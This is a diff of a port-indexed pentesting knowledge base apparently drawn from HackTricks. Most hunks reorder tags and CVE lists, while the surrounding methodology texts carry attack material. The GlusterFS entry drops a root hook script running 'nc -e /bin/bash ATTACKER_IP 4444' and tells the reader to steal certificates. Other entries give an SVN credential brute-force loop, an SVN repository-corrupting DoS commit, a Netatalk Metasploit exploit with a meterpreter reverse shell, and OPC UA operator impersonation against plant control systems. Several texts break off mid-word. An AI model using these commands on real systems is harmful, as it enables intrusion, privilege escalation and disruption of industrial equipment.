@@ -22,8 +22,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "10000",
-   "10000 network data management protocol ndmp"
+   "10000 network data management protocol ndmp",
+   "10000"
   ]
  },
  "1026": {
@@ -188,8 +188,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "1080 pentesting socks",
-   "1080"
+   "1080",
+   "1080 pentesting socks"
   ]
  },
  "1099": {
@@ -366,8 +366,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "1099",
-   "java-rmi"
+   "java-rmi",
+   "1099"
   ]
  },
  "113": {
@@ -554,8 +554,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "113 pentesting ident",
-   "113"
+   "113",
+   "113 pentesting ident"
   ]
  },
  "135": {
@@ -702,10 +702,10 @@
   "source": "hacktricks",
   "tags": [
    "auxiliary/scanner/dcerpc/endpoint_mapper",
-   "auxiliary/scanner/dcerpc/hidden",
+   "135",
    "msrpc",
    "auxiliary/scanner/dcerpc/tcp_dcerpc_auditor",
-   "135",
+   "auxiliary/scanner/dcerpc/hidden",
    "auxiliary/scanner/dcerpc/management"
   ]
  },
@@ -1163,10 +1163,10 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "post/punch-q)**,",
    "1414 pentesting ibmmq",
-   "1414",
-   "post/punch-q)"
+   "post/punch-q)**,",
+   "post/punch-q)",
+   "1414"
   ]
  },
  "1521": {
@@ -1378,8 +1378,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "15672",
-   "15672 pentesting rabbitmq management"
+   "15672 pentesting rabbitmq management",
+   "15672"
   ]
  },
  "1723": {
@@ -1405,8 +1405,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "1723",
-   "1723 pentesting pptp"
+   "1723 pentesting pptp",
+   "1723"
   ]
  },
  "1883": {
@@ -1858,9 +1858,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "2375",
    "exploit/linux/http/docker_daemon_tcp",
-   "2375 pentesting docker"
+   "2375 pentesting docker",
+   "2375"
   ]
  },
  "24007": {
@@ -1923,9 +1923,9 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2023-26253",
+   "CVE-2022-48340",
    "CVE-2023-3775",
-   "CVE-2022-48340"
+   "CVE-2023-26253"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\n**GlusterFS** is a **distributed file system** that combines storage from multiple servers into one **unified namespace**. The management daemon (`glusterd`) listens by default on **24007/TCP** and instructs data-plane bricks that start at **49152/TCP** (one port per brick, incrementing). Versions prior to 9.x used **24008–24009/TCP** for brick transport, so you will still encounter those ports in legacy clusters.\n\n```\nPORT      STATE  SERVICE        VERSION\n24007/tcp open   glusterd       GlusterFS (RPC)\n49152/tcp open   gluster-brick  SSL (TLS optional)\n```\n\n> Tip: 24007 answers RPC calls even when the storage-only nodes do **not** export any volume; therefore the service is a reliable pivot target inside large infrastructures.\n\n## Enumeration\nInstall the client utilities on your attacking box:\n\n```bash\nsudo apt install -y glusterfs-cli glusterfs-client   # Debian/Ubuntu\n```\n\n1. **Peer discovery & health**\n\n```bash\n\n## List peers (works without authentication in default setups)\ngluster --remote-host 10.10.11.131 peer status\n```\n\n2. **Volume reconnaissance**\n\n```bash\n\n## Retrieve the list of all volumes and their configuration\ngluster --remote-host 10.10.11.131 volume info all\n```\n\n3. **Mount without privileges**\n\n```bash\nsudo mount -t glusterfs 10.10.11.131:/<vol_name> /mnt/gluster\n```\n\nIf mounting fails, check `/var/log/glusterfs/<vol_name>-<uid>.log` on the client side.  Common issues are:\n\n* TLS enforcement (`option transport.socket.ssl on`)\n* Address based access control (`option auth.allow <cidr>`)\n\n## Certificate troubleshooting\nSteal the following files from any authorised client node and place them in `/etc/ssl/` (or the directory shown in the error log):\n\n```\n/etc/ssl/glusterfs.pem\n/etc/ssl/glusterfs.key\n/etc/ssl/glusterfs.ca\n```\n\n---\n\n## Known Vulnerabilities (2022-2025)\n| CVE | Affected versions | Impact | Notes |\n|-----|-------------------|--------|-------|\n| **CVE-2022-48340** | 10.0–10.4, 11.0 | Use-after-free in `dht_setxattr_mds_cbk` reachable through the network | Remote **DoS** and probable RCE. Fixed in 10.4.1 / 11.1. |\n| **CVE-2023-26253** | < 11.0 | Out-of-bounds read in FUSE notify handler | Remote crash via crafted FS operations; public PoC available. |\n| **CVE-2023-3775** | < 10.5 / 11.1 | Incorrect permission validation when mounting `gluster_shared_storage` | Lets any unauthenticated client mount the admin volume – leads to **priv-esc** explained below. |\n\n> Always check `gluster --version` **on every node**; heterogeneous clusters are common after partial upgrades.\n\n## Exploiting `gluster_shared_storage` (Privilege Escalation)\nEven in recent versions many administrators leave the special `gluster_shared_storage` volume world-readable because it simplifies geo-replication.  The volume contains cronjob templates that run with **root** on every node.\n\n```bash\n\n## 1. Mount admin volume anonymously\nmkdir /tmp/gss && sudo mount -t glusterfs 10.10.11.131:/gluster_shared_storage /tmp/gss\n\n## 2. Drop malicious script that gets synchronised cluster-wide\ncat <<'EOF' > /tmp/gss/hooks/1/start/post/test.sh\n#!/bin/bash\nnc -e /bin/bash ATTACKER_IP 4444 &\nEOF\nchmod +x /tmp/gss/hooks/1/start/post/test.sh\n\n## 3. Wait until glusterd distributes the hook and executes it as root\n```\n\nIf `hooks/1/` is not present, look for `/ss_bricks/` – the exact path may vary with the major version.",
@@ -1933,9 +1933,9 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "post/test.sh",
    "24007",
-   "24007 24008 24009 49152 pentesting glusterfs"
+   "24007 24008 24009 49152 pentesting glusterfs",
+   "post/test.sh"
   ]
  },
  "27017": {
@@ -2298,8 +2298,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "3260 pentesting iscsi",
-   "3260"
+   "3260",
+   "3260 pentesting iscsi"
   ]
  },
  "3299": {
@@ -2371,11 +2371,11 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/sap/sap_router_info_request",
+   "auxiliary/scanner/sap/sap_service_discovery",
    "post/2014/01/09/piercing-saprouter-with-metasploit/](https://www.rapid7.com/blog/post/2014/01/09/piercing-saprouter-with-metasploit/)",
    "3299 pentesting saprouter",
-   "auxiliary/scanner/sap/sap_service_discovery",
-   "3299"
+   "3299",
+   "auxiliary/scanner/sap/sap_router_info_request"
   ]
  },
  "3632": {
@@ -2422,10 +2422,10 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
+   "distcc",
    "exploit/unix/misc/distcc_exec](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec)",
    "exploit/unix/misc/distcc_exec",
-   "3632",
-   "distcc"
+   "3632"
   ]
  },
  "3690": {
@@ -2497,8 +2497,8 @@
    }
   ],
   "common_vulnerabilities": [
-   "CVE-2024-45720",
-   "CVE-2024-46901"
+   "CVE-2024-46901",
+   "CVE-2024-45720"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\n**Subversion (SVN)** is a centralized **version control system** (Apache license) used for software versioning and revision control.\n\n**Default port:** `3690/tcp` (svnserve). It can also be exposed via **HTTP/HTTPS** through `mod_dav_svn` and via **svn+ssh**.\n\n```text\nPORT     STATE SERVICE\n3690/tcp open  svnserve Subversion\n```\n\n## Banner Grabbing\n```bash\nnc -vn 10.10.10.10 3690\nsvnserve --version           # if shell access is obtained\nsvn --version                # client version leak via error messages\n```\n\n## Anonymous / authenticated listing\nsvn ls svn://10.10.10.203                  # list root\nsvn ls -R svn://10.10.10.203/repo         # recursive list\nsvn info svn://10.10.10.203/repo          # repo metadata\nsvn log svn://10.10.10.203/repo           # commit history\nsvn checkout svn://10.10.10.203/repo      # checkout repository\nsvn up -r 2                               # move working copy to revision 2\nsvn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes\n\n## If served over HTTP(S)\nsvn ls https://10.10.10.10/svn/repo --username guest --password ''\n\n## Extract revision props (often contain build creds, URLs, tokens)\nsvn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo\n```\n\n## Auth & Misconfig Hunting\n- `svnserve.conf` may allow `anon-access = read` (or even write). If you can list, try `checkout` to dump secrets, scripts, CI tokens.\n- Repositories frequently store **build pipelines**, **deployment keys**, and **database credentials** in versioned config files. Grep the working copy after checkout: `grep -R \"password\\|secret\\|token\" -n .`.\n- If svn+ssh is enabled, user shells often allow restricted `svnserve` commands; attempt `ssh user@host svnserve -t` with crafted subcommands to bypass wrappers.\n\n## Bruteforcing credentials (svnserve)\n`sasl` authentication (if enabled) and simple password files are protected only by the transport; no lockout by default. A quick Bash loop can try credentials:\n```bash\nfor u in admin dev ci; do\n  for p in $(cat /tmp/passlist); do\n    svn ls --username \"$u\" --password \"$p\" svn://10.10.10.203/repo 2>/dev/null && echo \"[+] $u:$p\" && break\n  done\ndone\n```\n\n## mod_dav_svn DoS via control characters (CVE-2024-46901)\n- A user with commit rights can write a path containing control chars (e.g. `\\x01`, `\\x7f`) that **corrupts the repository**, making later checkouts/logs fail and potentially crashing `mod_dav_svn` workers.\n- Affects Subversion ≤ **1.14.4** when served through **HTTP(S)** (`mod_dav_svn`). Fixed in **1.14.5**.\n- PoC commit with `svnmucc` (requires valid commit creds):\n```bash\n\n## commit a path with a control character in its name\nsvnmucc -m \"DoS\" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\\x01path.txt'\n```\n- After the commit, normal clients may crash or refuse updates until admins manually remove the revision with `svnadmin dump/filter/load`.\n\n## Windows argument injection in svn client (CVE-2024-45720)\n- On Windows, \"best-fit\" character encoding in `svn.exe` allows **command-line argument injection** when processing specially crafted non‑ASCII paths/URLs, potentially leading to arbitrary program execution.\n- Affects Subversion ≤ **1.14.3** on Windows only; fixed in **1.14.4**. Attack surface: phishing a developer to run `svn` on an attacker-controlled URL/path.\n- Pentest angle: if you control a network share or ZIP given to a Windows dev, name a repo URL or working-copy path containing best-fit bytes that decode into `\" & calc.exe & \"`-style injected args, then trick the victim to run `svn status` or similar on that path.",
@@ -2506,8 +2506,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "3690 pentesting subversion svn server",
-   "3690"
+   "3690",
+   "3690 pentesting subversion svn server"
   ]
  },
  "3702": {
@@ -2569,8 +2569,8 @@
   "kill_chain_phase": "GENERAL",
   "source": "hacktricks",
   "tags": [
-   "3702 udp pentesting ws discovery",
-   "3702"
+   "3702",
+   "3702 udp pentesting ws discovery"
   ]
  },
  "4222": {
@@ -2657,8 +2657,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "4222",
-   "4222 pentesting nats"
+   "4222 pentesting nats",
+   "4222"
   ]
  },
  "43": {
@@ -2767,8 +2767,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "43 pentesting whois",
-   "43"
+   "43",
+   "43 pentesting whois"
   ]
  },
  "4369": {
@@ -2944,8 +2944,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "4369",
    "exploit/multi/misc/erlang_cookie_rce",
+   "4369",
    "erlang"
   ]
  },
@@ -3288,8 +3288,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "4786 cisco smart install",
-   "4786"
+   "4786",
+   "4786 cisco smart install"
   ]
  },
  "4840": {
@@ -3308,10 +3308,10 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
+   "CVE-2025-7390",
    "CVE-2024-53429",
-   "CVE-2024-42512",
    "CVE-2024-42513",
-   "CVE-2025-7390"
+   "CVE-2024-42512"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\n**OPC UA**, standing for **Open Platform Communications Unified Access**, is a crucial open-source protocol used in various industries like Manufacturing, Energy, Aerospace, and Defence for data exchange and equipment control. It uniquely enables different vendors' equipment to communicate, especially with PLCs.\n\nIts configuration allows for strong security measures, but often, for compatibility with older devices, these are lessened, exposing systems to risks. Additionally, finding OPC UA services can be tricky since network scanners might not detect them if they're on nonstandard ports.\n\n**Default port:** 4840 (binary `opc.tcp`). Many vendors expose separate discovery endpoints (`/discovery`), HTTPS bindings (4843/443), or vendor-specific listener ports such as 49320 (KepServerEX), 62541 (OPC Foundation reference stack) and 48050 (UaGateway). Expect multiple endpoints per host, each advertising transport profile, security policy and user-token support.\n\n| Built-in NodeId | Why it mat\n\n## Pentesting OPC UA\nTo reveal security issues in OPC UA servers, scan it with [OpalOPC](https://opalopc.com/).\n\n```bash\nopalopc -vv opc.tcp://$target_ip_or_hostname:$target_port\n```\n\n## Discovery & Enumeration Playbook\n1. **Locate all OPC UA transports**\n   ```bash\n   nmap -sV -Pn -n --open -p 4840,4843,49320,48050,53530,62541 $TARGET\n   ```\n   Repeat on UDP group addresses if the environment uses LDS-ME multicast discovery.\n\n2. **Fingerprint endpoints**\n   - Invoke `FindServers`/`GetEndpoints` over each transport to capture `SecurityPolicyUri`, `SecurityMode`, `UserTokenType`, application URI and product strings.\n   - Enumerate namespaces so you can resolve vendor-specific NodeIds; abuse namespace collisions to coax clients into loading attacker-controlled schemas.\n\n3. **Walk the address space**\n   - Start at `ObjectsFolder (i=85)` and recursively `Browse`/`Read` to find writable process variables, `Method` nodes and historian/log nodes.\n   - Query `ServerStatus.BuildInfo` to understand firmware provenance, and `ServerCapabilities.OperationLimits` to gauge how easy it is to exhaust server resources.\n   - If anonymous access is allowed, immediately test `Call` on maintenance methods (e.g., `ns=2;s=Re\n\n## Automated assessment with OpalOPC\n- The scanner can run interactively or headless, which is handy for CI/CD style OT baselines. Pipe its machine-readable findings into your reporting pipeline to highlight anonymous logins, weak policies, certificate validation errors and writable variables in minutes.\n- Combine OpalOPC output with manual browsing: feed the discovered endpoint list back into your custom tooling, then selectively weaponize high-impact nodes (e.g., `MotorControl/StartStop`, `RecipeManager/Upload`).\n\n## Attacking legacy security policies (Basic128Rsa15)\n- **Bleichenbacher-style oracle:** Systems that still allow the deprecated `Basic128Rsa15` policy (often toggled via build flags such as `CMPOPCUASTACK_ALLOW_SHA1_BASED_SECURITY`) leak padding validation differences. Exploit this by flooding `CreateSession` / `OpenSecureChannel` handshakes with crafted PKCS#1 v1.5 blobs to recover the server certificate’s private key, then impersonate the server or decrypt traffic.\n- **Authentication bypass:** OPC Foundation’s .NET Standard stack prior to 1.5.374.158 (CVE-2024-42512) and dependent products let unauthenticated attackers force that legacy policy and subsequently skip application-level authentication. Once you own the key material you can present arbitrary `UserIdentityTokens`, replay signed `ActivateSession` requests, and operate the plant as a trusted engineering workstation.\n- **Operational workflow:**\n  1. Enumerate policies with `GetEndpoints` and note any `Basic128Rsa15` entries.\n  2. Negotiate that policy explicitly (`SecurityPolic\n\n## 2024-2025 exploit watchlist\n- **open62541 fuzz_binary_decode (CVE-2024-53429):** SecureChannel chunks that declare oversized `ExtensionObject` bodies make the decoder dereference freed memory, so a pre-auth attacker can repeatedly crash UA servers that embed open62541 ≤1.4.6. Reuse the Claroty corpus (`opcua_message_boofuzz_db`) or craft your own Boofuzz harness to spam mutated `OpenSecureChannel` requests until the watchdog kills the process, then re-enumerate because many integrators fall back to anonymous mode after the reboot.\n- **Softing OPC UA C++ SDK / edgeConnector / edgeAggregator (CVE-2025-7390):** The TLS client-auth pipeline accepts any certificate that replays a trusted Common Name, so you can mint a throwaway cert, copy the CN from a plant engineer, and log in with arbitrary `UserNameIdentityToken` or `IssuedIdentityToken` data. Pair this with a downgrade to Basic128Rsa15 to strip integrity checks and persistently impersonate operators until trustlists are rebuilt.\n\n## Crafting OPC UA clients for exploitation\n- **Custom clients:** Drop-in libraries (python-opcua/asyncua, node-opcua, open62541) let you drive exploit logic yourself. Always enfo",
@@ -3319,8 +3319,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "4840 pentesting opc ua",
-   "4840"
+   "4840",
+   "4840 pentesting opc ua"
   ]
  },
  "49": {
@@ -3359,8 +3359,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "49 pentesting tacacs+",
-   "49"
+   "49",
+   "49 pentesting tacacs+"
   ]
  },
  "5000": {
@@ -3777,11 +3777,11 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/rservices/rexec_login",
-   "auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)",
-   "512",
    "rexec",
-   "auxiliary/scanner/rservices/rexec_login`"
+   "512",
+   "auxiliary/scanner/rservices/rexec_login`",
+   "auxiliary/scanner/rservices/rexec_login",
+   "auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)"
   ]
  },
  "515": {
@@ -3800,8 +3800,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "515",
-   "lpd"
+   "lpd",
+   "515"
   ]
  },
  "5353": {
@@ -3827,12 +3827,12 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2023-1981",
-   "CVE-2025-31222",
-   "CVE-2023-38469",
    "cve-2024-44183",
-   "CVE-2024-44183",
    "cve-2025-31222",
+   "CVE-2023-1981",
+   "CVE-2024-44183",
+   "CVE-2023-38469",
+   "CVE-2025-31222",
    "CVE-2024-20303"
   ],
   "privilege_escalation": [],
@@ -3841,8 +3841,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "5353 udp multicast dns mdns",
-   "5353"
+   "5353",
+   "5353 udp multicast dns mdns"
   ]
  },
  "5439": {
@@ -3949,8 +3949,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "554",
-   "rtsp"
+   "rtsp",
+   "554"
   ]
  },
  "5555": {
@@ -4034,8 +4034,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "kibana",
-   "5601"
+   "5601",
+   "kibana"
   ]
  },
  "5671": {
@@ -4209,8 +4209,8 @@
    }
   ],
   "common_vulnerabilities": [
-   "cve-2024-51988",
    "CVE-2024-51988",
+   "cve-2024-51988",
    "CVE-2025-50200"
   ],
   "privilege_escalation": [],
@@ -4219,8 +4219,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "5671 5672 pentesting amqp",
-   "5671"
+   "5671",
+   "5671 5672 pentesting amqp"
   ]
  },
  "584": {
@@ -4327,10 +4327,10 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2018-1160",
-   "CVE-2022-22995",
    "CVE-2010-0533",
-   "CVE-2022-23121"
+   "CVE-2022-23121",
+   "CVE-2022-22995",
+   "CVE-2018-1160"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\nThe **Apple Filing Protocol** (**AFP**), once known as AppleTalk Filing Protocol, is a specialized network protocol included within **Apple File Service** (**AFS**). It is designed to provide file services for macOS and the classic Mac OS. AFP stands out for supporting Unicode file names, POSIX-style and ACL permissions, resource forks, named extended attributes and sophisticated file-locking mechanisms.\n\nAlthough AFP has been superseded by SMB in modern macOS releases (SMB is the default since OS X 10.9), it is still encountered in:\n\n* Legacy macOS / Mac OS 9 environments\n* NAS appliances (QNAP, Synology, Western Digital, TrueNAS…) that embed the open-source **Netatalk** daemon\n* Mixed-OS networks where Time-Machine-over-AFP is still enabled\n\n**Default TCP Port:** **548** (AFP over TCP / DSI)\n\n```bash\nPORT     STATE SERVICE\n548/tcp  open  afp\n```\n\n---\n\n## Metasploit auxiliary\nuse auxiliary/scanner/afp/afp_server_info\nrun RHOSTS=<IP>\n\n## Nmap NSE\nnmap -p 548 -sV --script \"afp-* and not dos\" <IP>\n```\n\nUseful AFP NSE scripts:\n\n| Script | What it does |\n|--------|--------------|\n| **afp-ls**            | List available AFP volumes and files |\n| **afp-brute**         | Password brute-force against AFP login |\n| **afp-serverinfo**    | Dump server name, machine type, AFP version, supported UAMs, etc. |\n| **afp-showmount**     | List shares together with their ACLs |\n| **afp-path-vuln**     | Detects (and can exploit) directory-traversal, CVE-2010-0533 |\n\nThe NSE brute-force script can be combined with Hydra/Medusa if more control is required:\n\n```bash\nhydra -L users.txt -P passwords.txt afp://<IP>\n```\n\n## or from terminal\nmkdir /Volumes/afp\nmount_afp afp://USER:[email protected]/SHARE /Volumes/afp\n```\n\n*Linux* (using `afpfs-ng` ‑ packaged in most distros)\n```bash\napt install afpfs-ng\nmkdir /mnt/afp\nmount_afp afp://USER:[email protected]/SHARE /mnt/afp\n\n## or interactive client\nafp_client <IP>\n```\n\nOnce mounted, remember that classic Mac resource-forks are stored as hidden `._*` AppleDouble files – these often hold interesting metadata that DFIR tools miss.\n\n---\n\n## Netatalk unauthenticated RCE chain (2022)\nSeveral NAS vendors shipped **Netatalk ≤3.1.12**. A lack of bounds checking in `parse_entries()` allows an attacker to craft a malicious **AppleDouble** header and obtain **remote root** before authentication (**CVSS 9.8 – CVE-2022-23121**). A full write-up by NCC Group with PoC exploiting Western-Digital PR4100 is available.\n\nMetasploit (>= 6.3) ships the module `exploit/linux/netatalk/parse_entries` which delivers the payload via DSI `WRITE`.\n\n```bash\nuse exploit/linux/netatalk/parse_entries\nset RHOSTS <IP>\nset TARGET 0   # Automatic (Netatalk)\nset PAYLOAD linux/x64/meterpreter_reverse_tcp\nrun\n```\n\nIf the target runs an affected QNAP/Synology firmware, successful exploitation yields a shell as **root**.\n\n## Netatalk OpenSession heap overflow (2018)\nOlder Netatalk (3.0.0 - 3.1.11) is vulnerable to an out-of-bounds write in the **DSI OpenSession** handler allowing unauthenticated code execution (**CVE-2018-1160**). A detailed analysis and PoC were published by Tenable Research.\n\n## Other notable issues\n* **CVE-2022-22995** – Symlink redirection leading to arbitrary file write / RCE when AppleDouble v2 is enabled (3.1.0 - 3.1.17).\n* **CVE-2010-0533** – Directory traversal in Apple Mac OS X 10.6 AFP (detected by `afp-path-vuln.nse`).\n* Multiple memory-safety bugs were fixed in **Netatalk 4.x (2024)** – recommend upgrading rather than patching individual CVEs.\n\n---\n\n## Defensive Recommendations\n1. **Disable AFP** unless strictly required – use SMB3 or NFS instead.\n2. If AFP must stay, **upgrade Netatalk to ≥ 3.1.18 or 4.x**, or apply vendor firmware that back-ports the 2022/2023/2024 patches.\n3. Enforce **Strong UAMs** (e.g. *DHX2*), disable clear-text and guest logins.\n4. Restrict TCP 548 to trusted subnets and wrap AFP inside a VPN when exposed remotely.\n5. Periodically scan with `nmap -p 548 --script afp-*` in CI/CD to catch rogue / downgraded appliances.\n\n---\n\n## References\n* Netatalk Security Advisory CVE-2022-23121 – \"Arbitrary code execution in parse_entries\" <https://netatalk.io/security/CVE-2022-23121>\n* Tenable Research – \"Exploiting an 18-Year-Old Bug (CVE-2018-1160)\" <https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172>\n{{#include ../banners/hacktricks-training.md}}",
@@ -4338,11 +4338,11 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "584",
-   "584 pentesting afp",
+   "exploit/linux/netatalk/parse_entries`",
    "auxiliary/scanner/afp/afp_server_info",
    "exploit/linux/netatalk/parse_entries",
-   "exploit/linux/netatalk/parse_entries`"
+   "584",
+   "584 pentesting afp"
   ]
  },
  "5984": {
@@ -4676,10 +4676,10 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
+   "CVE-2018-8007",
    "cve-2018-8007",
-   "CVE-2017-12636",
    "CVE-2017-12635",
-   "CVE-2018-8007"
+   "CVE-2017-12636"
   ],
   "privilege_escalation": [],
   "methodology": "## **Basic Information**\n**CouchDB** is a versatile and powerful **document-oriented database** that organizes data using a **key-value map** structure within each **document**. Fields within the document can be represented as **key/value pairs, lists, or maps**, providing flexibility in data storage and retrieval.\n\nEvery **document** stored in CouchDB is assigned a **unique identifier** (`_id`) at the document level. Additionally, each modification made and saved to the database is assigned a **revision number** (`_rev`). This revision number allows for efficient **tracking and management of changes**, facilitating easy retrieval and synchronization of data within the database.\n\n**Default port:** 5984(http), 6984(https)\n\n```\nPORT      STATE SERVICE REASON\n5984/tcp  open  unknown syn-ack\n```\n\n## **Automatic Enumeration**\n```bash\nnmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>\nmsf> use auxiliary/scanner/couchdb/couchdb_enum\n```\n\n## Banner\n```\ncurl http://IP:5984/\n```\n\nThis issues a GET request to installed CouchDB instance. The reply should look something like on of the following:\n\n```bash\n{\"couchdb\":\"Welcome\",\"version\":\"0.10.1\"}\n{\"couchdb\":\"Welcome\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}}\n```\n\n> [!TIP]\n> Note that if accessing the root of couchdb you receive a `401 Unauthorized` with something like this: `{\"error\":\"unauthorized\",\"reason\":\"Authentication required.\"}` **you won't be able to access** the banner or any other endpoint.\n\n## Info Enumeration\nThese are the endpoints where you can access with a **GET** request and extract some interesting info. You can find [**more endpoints and more detailed descriptions in the couchdb documentation**](https://docs.couchdb.org/en/latest/api/index.html).\n\n- **`/_active_tasks`** List of running tasks, including the task type, name, status and process ID.\n- **`/_all_dbs`** Returns a list of all the databases in the CouchDB instance.\n- **`/_cluster_setup`**Returns the status of the node or cluster, per the cluster setup wizard.\n- **`/_db_updates`** Returns a list of all database events in the CouchDB instance. The existence of the `_global_changes` database is required to use this endpoint.\n- **`/_membership`** Displays the nodes that are part of the cluster as `cluster_nodes`. The field `all_nodes` displays all nodes this node knows about, including the ones that are part of the cluster.\n- **`/_scheduler/jobs`** List of replication jobs. Each job description will include source and target info\n\n## **Database List**\n```\ncurl -X GET http://IP:5984/_all_dbs\n```\n\nIf that request **responds with a 401 unauthorised**, then you need some **valid credentials** to access the database:\n\n```\ncurl -X GET http://user:password@IP:5984/_all_dbs\n```\n\nIn order to find valid Credentials you could **try to** [**bruteforce the service**](../generic-hacking/brute-force.md#couchdb).\n\nThis is an **example** of a couchdb **response** when you have **enough privileges** to list databases (It's just a list of dbs):\n\n```bash\n[\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"passwords\",\"simpsons\"]\n```\n\n## Database Info\nYou can obtain some database info (like number of files and sizes) accessing the database name:\n\n```bash\ncurl http://IP:5984/<database>\ncurl http://localhost:5984/simpsons\n#Example response:\n{\"db_name\":\"simpsons\",\"update_seq\":\"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ\",\"sizes\":{\"file\":62767,\"external\":1320,\"active\":2466},\"purge_seq\":0,\"other\":{\"data_size\":1320},\"doc_del_count\":0,\"doc_count\":7,\"disk_size\":62767,\"disk_format_version\":6,\"data_size\":2466,\"compact_running\":false,\"instance_start_time\":\"0\"}\n```\n\n## **Document List**\nList each entry inside a database\n\n```bash\ncurl -X GET http://IP:5984/{dbname}/_all_docs\ncurl http://localhost:5984/simpsons/_all_docs\n#Example response:\n{\"total_rows\":7,\"offset\":0,\"rows\":[\n{\"id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"key\":\"f0042ac3dc4951b51f056467a1000dd9\",\"value\":{\"rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"}},\n{\"id\":\"f53679a526a868d44172c83a61000d86\",\"key\":\"f53679a526a868d44172c83a61000d86\",\"value\":{\"rev\":\"1-7b8ec9e1c3e29b2a826e3d14ea122f6e\"}},\n{\"id\":\"f53679a526a868d44172c83a6100183d\",\"key\":\"f53679a526a868d44172c83a6100183d\",\"value\":{\"rev\":\"1-e522ebc6aca87013a89dd4b37b762bd3\"}},\n{\"id\":\"f53679a526a868d44172c83a61002980\",\"key\":\"f53679a526a868d44172c83a61002980\",\"value\":{\"rev\":\"1-3bec18e3b8b2c41797ea9d61a01c7cdc\"}},\n{\"id\":\"f53679a526a868d44172c83a61003068\",\"key\":\"f53679a526a868d44172c83a61003068\",\"value\":{\"rev\":\"1-3d2f7da6bd52442e4598f25cc2e84540\"}},\n{\"id\":\"f53679a526a868d44172c83a61003a2a\",\"key\":\"f53679a526a868d44172c83a61003a2a\",\"value\":{\"rev\":\"1-4446bfc0826ed3d81c9115e45\n\n## **Read Document**\nRead the content of a document inside a database:\n\n```bash\ncurl -X GET http://IP:5984/{dbname}/{id}\ncurl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9\n#Example respo",
@@ -4687,9 +4687,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
+   "5984",
    "auxiliary/scanner/couchdb/couchdb_enum",
-   "5984 pentesting couchdb",
-   "5984"
+   "5984 pentesting couchdb"
   ]
  },
  "5985": {
@@ -5240,10 +5240,10 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "6000 pentesting x11",
    "exploit/unix/x11/x11_keyboard_exec",
-   "auxiliary/scanner/x11/open_x11",
-   "6000"
+   "6000",
+   "6000 pentesting x11",
+   "auxiliary/scanner/x11/open_x11"
   ]
  },
  "623": {
@@ -5415,12 +5415,12 @@
   "kill_chain_phase": "ENUMERATION",
